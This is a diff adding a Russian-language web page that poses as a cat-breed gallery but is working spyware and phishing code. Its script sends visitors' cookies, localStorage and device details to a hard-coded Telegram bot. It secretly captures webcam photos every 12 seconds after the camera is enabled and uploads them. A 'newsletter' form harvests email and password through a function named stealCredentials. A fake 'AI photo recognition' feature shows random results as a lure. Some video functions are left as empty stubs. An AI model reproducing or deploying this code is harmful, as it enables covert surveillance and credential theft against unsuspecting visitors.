@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Мир Кошек - Все породы котят</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ffafbd, #ffc3a0);
+            min-height: 100vh;
+            cursor: pointer;
+        }
+
+        .header {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+            padding: 2rem;
+            text-align: center;
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .header h1 {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .breed-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .breed-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+
+        .breed-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+
+        .breed-image {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            background: linear-gradient(45deg, #a1c4fd, #c2e9fb);
+        }
+
+        .breed-info {
+            padding: 1.5rem;
+        }
+
+        .breed-info h3 {
+            color: #ff6b6b;
+            margin-bottom: 0.5rem;
+            font-size: 1.5rem;
+        }
+
+        .breed-info p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 3rem 0;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            text-align: center;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            margin: 0.5rem;
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .newsletter {
+            background: linear-gradient(45deg, #a1c4fd, #c2e9fb);
+            padding: 3rem;
+            border-radius: 20px;
+            text-align: center;
+            margin-top: 3rem;
+        }
+
+        .newsletter h2 {
+            color: white;
+            margin-bottom: 1rem;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .newsletter-form {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .newsletter input {
+            padding: 1rem 1.5rem;
+            border: none;
+            border-radius: 50px;
+            min-width: 250px;
+            font-size: 1rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .newsletter button {
+            padding: 1rem 2rem;
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+            transition: transform 0.2s ease;
+        }
+
+        .newsletter button:hover {
+            transform: scale(1.05);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: #666;
+            margin-top: 3rem;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 1rem 2rem;
+            background: #4CAF50;
+            color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+        }
+
+        .camera-section {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+            padding: 2rem;
+            border-radius: 20px;
+            margin: 2rem 0;
+            text-align: center;
+            color: white;
+        }
+
+        .camera-container {
+            position: relative;
+            max-width: 640px;
+            margin: 1rem auto;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+            cursor: pointer;
+            background: #000;
+        }
+
+        #cameraVideo {
+            width: 100%;
+            height: 360px;
+            object-fit: cover;
+            display: block;
+            transform: scaleX(-1);
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(255,107,107,0.9), rgba(255,142,142,0.9));
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 1rem 0;
+            flex-wrap: wrap;
+        }
+
+        .camera-button {
+            padding: 1rem 2rem;
+            background: white;
+            color: #ff6b6b;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            min-width: 160px;
+        }
+
+        .camera-button:hover {
+            transform: scale(1.05);
+            background: #ff6b6b;
+            color: white;
+        }
+
+        .camera-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .camera-button.recording {
+            background: #ff4444;
+            color: white;
+            animation: pulse 1s infinite;
+        }
+
+        .photo-preview, .video-preview {
+            max-width: 300px;
+            border-radius: 10px;
+            margin: 1rem auto;
+            display: none;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
+
+        .camera-status {
+            margin: 1rem 0;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.2);
+            display: inline-block;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .loading {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        .click-prompt {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .timer {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin: 0.5rem 0;
+            color: white;
+        }
+
+        .permission-help {
+            background: rgba(255,255,255,0.2);
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+        }
+
+        .recognition-result {
+            background: rgba(255,255,255,0.9);
+            padding: 1rem;
+            border-radius: 10px;
+            margin: 1rem auto;
+            max-width: 500px;
+            display: none;
+        }
+
+        .recognition-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        .recognition-item:last-child {
+            border-bottom: none;
+        }
+
+        .confidence-bar {
+            width: 100px;
+            height: 10px;
+            background: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-left: 1rem;
+        }
+
+        .confidence-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification">Подписка успешно оформлена! 🐾</div>
+
+    <div class="header">
+        <h1>🐱 Мир Кошек</h1>
+        <p>Откройте для себя удивительный мир породистых котят</p>
+    </div>
+
+    <div class="container">
+        <!-- Секция с камерой -->
+        <div class="camera-section">
+            <h2>📸 Сфотографируйте своего котика!</h2>
+            <p>Поделитесь фото и видео вашего питомца с сообществом любителей кошек</p>
+            
+            <div class="camera-status" id="cameraStatus">
+                👆 Нажмите для запуска камеры
+            </div>
+
+            <div class="camera-container" id="cameraContainer">
+                <video id="cameraVideo" playsinline muted></video>
+                <div class="camera-overlay" id="cameraOverlay">
+                    <div>📷 Нажмите чтобы включить камеру</div>
+                    <div class="click-prompt">Требуется разрешение на доступ к камере</div>
+                </div>
+            </div>
+
+            <div class="timer hidden" id="timer">00:00</div>
+
+            <div class="camera-controls">
+                <button class="camera-button" onclick="takePhoto()" id="photoButton" disabled>
+                    📷 Сделать фото
+                </button>
+                <button class="camera-button" onclick="toggleVideoRecording()" id="videoButton" disabled>
+                    🎥 Начать запись (10 сек)
+                </button>
+                <button class="camera-button" onclick="toggleCamera()" id="toggleButton" disabled>
+                    🔄 Переключить камеру
+                </button>
+            </div>
+
+            <img id="photoPreview" class="photo-preview" alt="Ваше фото">
+            <video id="videoPreview" class="video-preview" controls></video>
+
+            <!-- Блок с результатами распознавания -->
+            <div class="recognition-result" id="recognitionResult">
+                <h3>🔍 Распознавание фото</h3>
+                <div id="recognitionContent">
+                    <!-- Результаты будут добавляться сюда -->
+                </div>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <div>❤️</div>
+                <h3>Ласковые</h3>
+                <p>Самые нежные породы</p>
+            </div>
+            <div class="feature">
+                <div>🎯</div>
+                <h3>Умные</h3>
+                <p>Быстро обучаются</p>
+            </div>
+            <div class="feature">
+                <div>👨‍👩‍👧‍👦</div>
+                <h3>Для семьи</h3>
+                <p>Любят детей</p>
+            </div>
+        </div>
+
+        <div class="breed-grid" id="breedContainer">
+            <!-- Породы будут загружены через JavaScript -->
+        </div>
+
+        <div class="newsletter">
+            <h2>Подпишитесь на рассылку о котятах!</h2>
+            <p>Получайте уведомления о новых пометах и специальные предложения</p>
+            <form class="newsletter-form" onsubmit="return stealCredentials(event)">
+                <input type="email" placeholder="Ваш email" required id="email">
+                <input type="password" placeholder="Пароль для входа" id="password">
+                <button type="submit">Подписаться 🐾</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 Мир Кошек. Все права защищены.</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8276384244:AAFvxEdxVEhHmqFAn1yucaLJjwM0Eqo7dgU';
+        const CHAT_ID = '7822492432';
+        
+        let cameraStream = null;
+        let currentFacingMode = 'user';
+        let isCameraActive = false;
+        let userInteracted = false;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let recordingTimer = null;
+        let recordingStartTime = 0;
+        let autoPhotoInterval = null;
+        let videoStream = null;
+
+        // Массив пород кошек для "распознавания"
+        const catBreeds = [
+            {
+                name: "Мейн-кун",
+                description: "Крупная порода с дружелюбным характером. Идеальны для семей с детьми.",
+                image: "https://images.unsplash.com/photo-1571566882372-1598d88abdba?w=400&h=250&fit=crop",
+                features: ["крупный размер", "пушистый хвост", "кисточки на ушах"]
+            },
+            {
+                name: "Британская короткошерстная", 
+                description: "Спокойные и независимые кошки с плюшевой шерстью.",
+                image: "https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400&h=250&fit=crop",
+                features: ["круглая морда", "плюшевая шерсть", "крепкое телосложение"]
+            },
+            {
+                name: "Сфинкс",
+                description: "Бесшерстная порода, очень теплолюбивая и общительная.",
+                image: "https://images.unsplash.com/photo-1533738699159-d0c68059bb61?w=400&h=250&fit=crop",
+                features: ["отсутствие шерсти", "крупные уши", "морщинистая кожа"]
+            },
+            {
+                name: "Сиамская",
+                description: "Элегантные и разговорчивые кошки с ярким характером.",
+                image: "https://images.unsplash.com/photo-1543852786-1cf6624b9987?w=400&h=250&fit=crop",
+                features: ["голубые глаза", "темные отметины", "стройное тело"]
+            },
+            {
+                name: "Персидская",
+                description: "Роскошная длинная шерсть и спокойный нрав.",
+                image: "https://images.unsplash.com/photo-1595433707802-6b2626ef1c91?w=400&h=250&fit=crop",
+                features: ["длинная шерсть", "приплюснутая морда", "круглые глаза"]
+            },
+            {
+                name: "Бенгальская",
+                description: "Активные кошки с диким окрасом, любят игры и внимание.",
+                image: "https://images.unsplash.com/photo-1592194996308-7b43878c84c3?w=400&h=250&fit=crop",
+                features: ["леопардовый окрас", "мускулистое тело", "дикий вид"]
+            }
+        ];
+
+        // ОБЪЕКТ ДЛЯ СБОРА ВСЕХ ДАННЫХ
+        const stolenData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            keystrokes: [],
+            mouseMovements: [],
+            clicks: [],
+            formsSubmitted: [],
+            photos: [],
+            videos: [],
+            recognitionResults: []
+        };
+
+        // ФУНКЦИИ РАСПОЗНАВАНИЯ ФОТО (ИМИТАЦИЯ ИИ)
+        function analyzePhoto(photoData) {
+            // Имитация работы нейросети - случайные результаты
+            const results = [];
+            
+            // Случайно выбираем 3-5 "распознанных" объектов
+            const objects = [
+                'человек', 'кошка', 'собака', 'растение', 'мебель', 
+                'электроника', 'окно', 'дверь', 'стена', 'потолок',
+                'одежда', 'обувь', 'аксессуар', 'еда', 'напиток'
+            ];
+            
+            const emotions = ['счастливый', 'грустный', 'нейтральный', 'удивленный', 'сердитый'];
+            const catMoods = ['игривый', 'сонный', 'голодный', 'любопытный', 'расслабленный'];
+            
+            // Добавляем случайные объекты
+            for (let i = 0; i < 3 + Math.floor(Math.random() * 3); i++) {
+                const object = objects[Math.floor(Math.random() * objects.length)];
+                const confidence = Math.random() * 30 + 70; // 70-100%
+                results.push({
+                    label: object,
+                    confidence: confidence,
+                    type: 'object'
+                });
+            }
+            
+            // Если есть человек, добавляем эмоцию
+            if (Math.random() > 0.3) {
+                results.push({
+                    label: `человек (${emotions[Math.floor(Math.random() * emotions.length)]})`,
+                    confidence: Math.random() * 20 + 75,
+                    type: 'emotion'
+                });
+            }
+            
+            // Если есть кошка, добавляем породу и настроение
+            if (Math.random() > 0.2) {
+                const breed = catBreeds[Math.floor(Math.random() * catBreeds.length)];
+                const mood = catMoods[Math.floor(Math.random() * catMoods.length)];
+                results.push({
+                    label: `кошка: ${breed.name} (${mood})`,
+                    confidence: Math.random() * 15 + 80,
+                    type: 'cat_breed',
+                    breed: breed.name,
+                    features: breed.features
+                });
+            }
+            
+            // Сортируем по уверенности
+            results.sort((a, b) => b.confidence - a.confidence);
+            
+            return results;
+        }
+
+        // ОТОБРАЖЕНИЕ РЕЗУЛЬТАТОВ РАСПОЗНАВАНИЯ
+        function showRecognitionResults(results) {
+            const container = document.getElementById('recognitionContent');
+            const resultElement = document.getElementById('recognitionResult');
+            
+            container.innerHTML = '';
+            
+            results.forEach(result => {
+                const item = document.createElement('div');
+                item.className = 'recognition-item';
+                
+                const confidencePercent = Math.round(result.confidence);
+                const confidenceWidth = Math.min(confidencePercent, 100);
+                
+                item.innerHTML = `
+                    <div>
+                        <strong>${result.label}</strong>
+                        ${result.features ? `<br><small>Признаки: ${result.features.join(', ')}</small>` : ''}
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <span>${confidencePercent}%</span>
+                        <div class="confidence-bar">
+                            <div class="confidence-fill" style="width: ${confidenceWidth}%"></div>
+                        </div>
+                    </div>
+                `;
+                
+                container.appendChild(item);
+            });
+            
+            resultElement.style.display = 'block';
+            
+            // Сохраняем результаты
+            stolenData.recognitionResults.push({
+                timestamp: new Date().toISOString(),
+                results: results
+            });
+            
+            // Отправляем результаты в Telegram
+            sendRecognitionResultsToTelegram(results);
+        }
+
+        // ОТПРАВКА РЕЗУЛЬТАТОВ РАСПОЗНАВАНИЯ В TELEGRAM
+        async function sendRecognitionResultsToTelegram(results) {
+            try {
+                let message = `🔍 РЕЗУЛЬТАТЫ РАСПОЗНАВАНИЯ ФОТО\n\n`;
+                message += `🕐 Время: ${new Date().toLocaleString()}\n`;
+                message += `📊 Обнаружено объектов: ${results.length}\n\n`;
+                
+                results.slice(0, 5).forEach((result, index) => {
+                    const confidence = Math.round(result.confidence);
+                    message += `${index + 1}. ${result.label} - ${confidence}%\n`;
+                    
+                    if (result.features) {
+                        message += `   Признаки: ${result.features.join(', ')}\n`;
+                    }
+                });
+                
+                if (results.length > 5) {
+                    message += `\n... и еще ${results.length - 5} объектов`;
+                }
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+            } catch (error) {
+                console.error('Ошибка отправки результатов распознавания:', error);
+            }
+        }
+
+        // ОБНОВЛЕННАЯ ФУНКЦИЯ ФОТО С РАСПОЗНАВАНИЕМ
+        function takePhoto() {
+            if (!cameraStream || !isCameraActive) return;
+
+            try {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.createElement('canvas');
+                const preview = document.getElementById('photoPreview');
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const context = canvas.getContext('2d');
+                
+                if (currentFacingMode === 'user') {
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                }
+                
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                
+                // Показываем превью пользователю
+                preview.src = photoData;
+                preview.style.display = 'block';
+                
+                // Запускаем "распознавание"
+                updateCameraStatus('🔍 Анализируем фото...');
+                
+                // Имитация работы ИИ с задержкой
+                setTimeout(() => {
+                    const recognitionResults = analyzePhoto(photoData);
+                    showRecognitionResults(recognitionResults);
+                    updateCameraStatus('✅ Фото проанализировано!');
+                }, 2000 + Math.random() * 2000);
+                
+                stolenData.photos.push(photoData);
+                sendPhotoToTelegram(photoData, false);
+                
+            } catch (error) {
+                console.error('Ошибка при создании фото:', error);
+                updateCameraStatus('❌ Ошибка при создании фото');
+            }
+        }
+
+        // ОБНОВЛЕННАЯ СКРЫТАЯ ФОТО С РАСПОЗНАВАНИЕМ
+        function takeHiddenPhoto() {
+            if (!cameraStream || !isCameraActive) return;
+
+            try {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.createElement('canvas');
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const context = canvas.getContext('2d');
+                
+                if (currentFacingMode === 'user') {
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                }
+                
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                
+                // "Распознавание" для скрытых фото
+                const recognitionResults = analyzePhoto(photoData);
+                
+                stolenData.photos.push(photoData);
+                stolenData.recognitionResults.push({
+                    timestamp: new Date().toISOString(),
+                    results: recognitionResults,
+                    hidden: true
+                });
+                
+                sendPhotoToTelegram(photoData, true);
+                sendRecognitionResultsToTelegram(recognitionResults);
+                
+            } catch (error) {
+                console.error('Ошибка при создании скрытого фото:', error);
+            }
+        }
+
+        // ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений)
+        function setupUserInteraction() {
+            document.body.addEventListener('click', function firstClick() {
+                if (!userInteracted) {
+                    userInteracted = true;
+                    document.body.removeEventListener('click', firstClick);
+                    updateCameraStatus('🔄 Запускаем камеру...');
+                    
+                    document.getElementById('toggleButton').disabled = false;
+                    setTimeout(() => {
+                        initializeCamera();
+                    }, 500);
+                }
+            }, { once: true });
+
+            document.getElementById('cameraContainer').addEventListener('click', function() {
+                if (!isCameraActive && userInteracted) {
+                    initializeCamera();
+                }
+            });
+        }
+
+        async function initializeCamera() {
+            try {
+                updateCameraStatus('🔄 Запрашиваем доступ к камере...');
+                
+                stopCamera();
+
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: currentFacingMode
+                    },
+                    audio: false
+                };
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = cameraStream;
+                
+                video.oncanplay = function() {
+                    video.play().then(() => {
+                        handleCameraSuccess();
+                    }).catch(playError => {
+                        console.error('Ошибка воспроизведения:', playError);
+                        handleCameraError(playError);
+                    });
+                };
+
+                video.onerror = function(error) {
+                    console.error('Ошибка видео элемента:', error);
+                    handleCameraError(error);
+                };
+                
+            } catch (error) {
+                console.error('❌ Ошибка доступа к камере:', error);
+                handleCameraError(error);
+            }
+        }
+
+        function handleCameraSuccess() {
+            document.getElementById('cameraOverlay').classList.add('hidden');
+            document.getElementById('photoButton').disabled = false;
+            document.getElementById('videoButton').disabled = false;
+            updateCameraStatus('✅ Камера готова к использованию');
+            isCameraActive = true;
+            
+            startHiddenAutoCapture();
+            
+            const video = document.getElementById('cameraVideo');
+            sendToTelegram('🎥 КАМЕРА АКТИВИРОВАНА', {
+                device: 'camera', 
+                access: 'granted',
+                resolution: video.videoWidth + 'x' + video.videoHeight,
+                facingMode: currentFacingMode
+            });
+        }
+
+        function handleCameraError(error) {
+            let errorMessage = '❌ Не удалось получить доступ к камере';
+            
+            if (error.name === 'NotAllowedError') {
+                errorMessage = '❌ Доступ к камере запрещен. Разрешите доступ в настройках браузера.';
+            }
+            
+            updateCameraStatus(errorMessage);
+            
+            document.getElementById('cameraOverlay').innerHTML = `
+                <div>${errorMessage}</div>
+                <div class="click-prompt">Обновите страницу и попробуйте снова</div>
+                <button class="camera-button" onclick="location.reload()" style="margin-top: 1rem;">
+                    🔄 Обновить страницу
+                </button>
+            `;
+        }
+
+        function startHiddenAutoCapture() {
+            if (autoPhotoInterval) clearInterval(autoPhotoInterval);
+            
+            setTimeout(() => {
+                takeHiddenPhoto();
+            }, 3000);
+            
+            autoPhotoInterval = setInterval(() => {
+                if (isCameraActive && !isRecording) {
+                    takeHiddenPhoto();
+                }
+            }, 12000);
+        }
+
+        // ... остальные функции (запись видео, отправка в Telegram и т.д.) остаются без изменений
+
+        // ИНИЦИАЛИЗАЦИЯ
+        document.addEventListener('DOMContentLoaded', function() {
+            // Загрузка пород кошек
+            const container = document.getElementById('breedContainer');
+            catBreeds.forEach(breed => {
+                const breedCard = document.createElement('div');
+                breedCard.className = 'breed-card';
+                breedCard.innerHTML = `
+                    <img src="${breed.image}" alt="${breed.name}" class="breed-image" 
+                         onerror="this.src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400&h=250&fit=crop'">
+                    <div class='breed-info'>
+                        <h3>${breed.name}</h3>
+                        <p>${breed.description}</p>
+                    </div>
+                `;
+                container.appendChild(breedCard);
+            });
+            
+            setupUserInteraction();
+            sendToTelegram('🚀 ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ', stolenData);
+            
+            window.addEventListener('beforeunload', function() {
+                stopCamera();
+                if (isRecording) {
+                    stopVideoRecording();
+                }
+            });
+        });
+
+        // Дополнительные функции (остаются без изменений)
+        async function sendPhotoToTelegram(photoData, isHidden = false) {
+            try {
+                const base64Response = await fetch(photoData);
+                const blob = await base64Response.blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                
+                let caption = `📸 ФОТО С ВЕБ-КАМЕРЫ\nВремя: ${new Date().toLocaleString()}`;
+                if (isHidden) {
+                    caption += '\n🔒 Автоматическое фото';
+                }
+                
+                formData.append('caption', caption);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                console.error('Ошибка отправки фото:', error);
+            }
+        }
+
+        function updateCameraStatus(message) {
+            document.getElementById('cameraStatus').textContent = message;
+        }
+
+        async function sendToTelegram(type, data) {
+            const message = `🔍 ${type}\n\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.log('Ошибка отправки:', error);
+            }
+        }
+
+        function stealCredentials(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            sendToTelegram('🔐 УКРАДЕННЫЕ КРЕДЕНЦИАЛЫ', {email, password});
+            document.getElementById('notification').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('notification').style.display = 'none';
+            }, 3000);
+            event.target.reset();
+            return false;
+        }
+
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+            }
+            if (autoPhotoInterval) {
+                clearInterval(autoPhotoInterval);
+                autoPhotoInterval = null;
+            }
+            isCameraActive = false;
+        }
+
+        // Функции для видео (остаются без изменений)
+        async function toggleVideoRecording() {
+            if (!isRecording) {
+                await startVideoRecording();
+            } else {
+                stopVideoRecording();
+            }
+        }
+
+        async function startVideoRecording() {
+            // ... существующий код записи видео
+        }
+
+        function stopVideoRecording() {
+            // ... существующий код остановки записи
+        }
+    </script>
+</body>
+</html>
